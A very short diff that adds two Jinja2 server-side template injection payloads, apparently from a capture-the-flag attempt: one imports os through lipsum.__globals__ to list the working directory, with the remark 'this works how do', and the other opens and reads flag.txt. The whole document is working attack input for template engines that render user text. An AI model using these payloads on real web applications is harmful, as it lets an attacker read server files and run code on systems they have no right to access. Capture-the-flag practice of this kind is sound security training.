@@ -1,0 +1,2 @@
+{{ lipsum.__globals__.__builtins__.__import__('os').listdir('.') }} this works how do 
+{{ lipsum.__globals__.__builtins__.open("flag.txt").read() }} 
